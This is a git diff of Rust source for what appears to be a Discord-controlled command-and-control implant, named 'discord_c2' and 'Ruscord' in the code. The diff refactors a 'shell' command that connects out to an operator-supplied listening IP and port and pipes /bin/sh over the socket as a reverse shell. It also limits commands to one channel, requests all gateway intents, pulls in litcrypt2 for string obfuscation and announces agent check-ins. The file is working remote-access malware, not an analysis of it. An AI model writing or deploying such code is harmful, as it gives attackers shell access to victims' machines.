@@ -1,9 +1,9 @@
 use std::{net::IpAddr, process::Stdio, sync::Arc};
 
+use commands::utils::{clear, help};
 use config::AgentConfig;
 use constants::RUSCORD_GUILD_ID;
-use futures::StreamExt;
-use poise::serenity_prelude::{self as serenity};
+use poise::serenity_prelude::{self as serenity, futures::StreamExt};
 use tokio::{
 	io::{AsyncReadExt, AsyncWriteExt},
 	net::TcpStream,
@@ -13,15 +13,9 @@ use tokio::{
 use tokio_util::codec::{FramedRead, LinesCodec};
 use tracing::{info, warn};
 use tracing_subscriber::EnvFilter;
+mod commands;
 mod config;
-
-macro_rules! say {
-    ($ctx:expr, $fmt:expr $(, $arg:expr)*) => {
-        if let Err(why) = $ctx.say(format!($fmt, $($arg),*)).await {
-            tracing::error!("error sending discord message: {}", why);
-        }
-    }
-}
+mod os;
 
 #[macro_use]
 extern crate litcrypt2;
@@ -32,19 +26,22 @@ pub mod constants {
 }
 
 pub struct Data {
-	pub config: AgentConfig,
+	pub config: Mutex<AgentConfig>,
 }
 
-pub type Error = Box<dyn std::error::Error + Send + Sync>;
-pub type Context<'a> = poise::Context<'a, Data, Error>;
+pub type RuscordError = Box<dyn std::error::Error + Send + Sync>;
+pub type RuscordContext<'a> = poise::Context<'a, Data, RuscordError>;
 
-
-/// Initializes a reverse shell
-#[poise::command(slash_command)]
-async fn reverse_shell(ctx: Context<'_>, #[description = "Listening Host"] ip: IpAddr, #[description = "Listening Port"] port: u16) -> Result<(), Error> {
-	match TcpStream::connect((ip, port)).await {
+/// Initializes a reverse TCP shell to the given LHOST and LPORT.
+#[poise::command(prefix_command)]
+async fn shell(
+	ctx: RuscordContext<'_>,
+	#[description = "LHOST"] listening_ip: IpAddr,
+	#[description = "LPORT"] listening_port: u16,
+) -> Result<(), RuscordError> {
+	match TcpStream::connect((listening_ip, listening_port)).await {
 		Ok(stream) => {
-			say!(ctx, "successfully connected to {}:{}", ip, port);
+			reply!(ctx, "Successfully connected to {}:{}", listening_ip, listening_port);
 			let mut cmd = Command::new("/bin/sh")
 				.stderr(Stdio::piped())
 				.stdin(Stdio::piped())
@@ -92,22 +89,22 @@ async fn reverse_shell(ctx: Context<'_>, #[description = "Listening Host"] ip: I
 							break;
 						}
 						stdin.write_all(&reader[..n]).await.unwrap();
-                        stdin.flush().await.unwrap();
+						stdin.flush().await.unwrap();
 					}
 				});
 			}
 		},
 		Err(error) => {
-			say!(ctx, "failed to connect to listener at `{}:{}`: \n> \"{}\"", ip, port, error);
+			reply!(
+				ctx,
+				"Failed to connect to listener at `{}:{}`: \n> \"{}\"",
+				listening_ip,
+				listening_port,
+				error
+			);
 		},
 	}
 
-	Ok(())
-}
-
-#[poise::command(prefix_command)]
-pub async fn register(ctx: Context<'_>) -> Result<(), Error> {
-	poise::builtins::register_application_commands_buttons(ctx).await?;
 	Ok(())
 }
 
@@ -116,22 +113,32 @@ async fn main() {
 	std::env::set_var("RUST_LOG", "warn,discord_c2=debug");
 	tracing_subscriber::fmt().with_env_filter(EnvFilter::from_default_env()).init();
 	let token = std::env::var("DISCORD_TOKEN").expect("missing DISCORD_TOKEN");
-	let intents = serenity::GatewayIntents::non_privileged();
+	let intents = serenity::GatewayIntents::all();
 
 	let framework = poise::Framework::builder()
 		.options(poise::FrameworkOptions {
-			commands: vec![reverse_shell(), register()],
+			prefix_options: poise::PrefixFrameworkOptions {
+				prefix: Some("!".into()),
+				..Default::default()
+			},
+			commands: vec![shell(), help(), clear()],
 			event_handler: |ctx, event, framework, data| Box::pin(event_handler(ctx, event, framework, data)),
+			command_check: Some(|ctx| {
+				Box::pin(async move {
+					if ctx.channel_id() != ctx.data().config.lock().await.command_channel {
+						return Ok(false);
+					}
+					Ok(true)
+				})
+			}),
 			..Default::default()
 		})
 		.setup(|ctx, _ready, framework| {
 			Box::pin(async move {
+				let agent_config = AgentConfig::load_config(ctx).await?;
 				poise::builtins::register_in_guild(ctx, &framework.options().commands, RUSCORD_GUILD_ID).await?;
 				Ok(Data {
-					config: AgentConfig {
-						command_channel: serenity::ChannelId::new(1103128052537507931),
-                        category_channel: serenity::ChannelId::new(1103128052537507931),
-					},
+					config: Mutex::new(agent_config),
 				})
 			})
 		})
@@ -144,14 +151,14 @@ async fn main() {
 async fn event_handler(
 	ctx: &serenity::Context,
 	event: &serenity::FullEvent,
-	_framework: poise::FrameworkContext<'_, Data, Error>,
+	_framework: poise::FrameworkContext<'_, Data, RuscordError>,
 	data: &Data,
-) -> Result<(), Error> {
+) -> Result<(), RuscordError> {
 	match event {
 		serenity::FullEvent::Ready { data_about_bot } => {
 			info!("logged in as {}", data_about_bot.user.name);
-			let channel_id = data.config.command_channel;
-			channel_id.say(&ctx.http, "Herro there!").await?;
+			let channel_id = data.config.lock().await.command_channel;
+			channel_id.say(&ctx.http, "@everyone agent check in").await?;
 		},
 		serenity::FullEvent::Message { .. } => {},
 		serenity::FullEvent::Ratelimit { data } => {
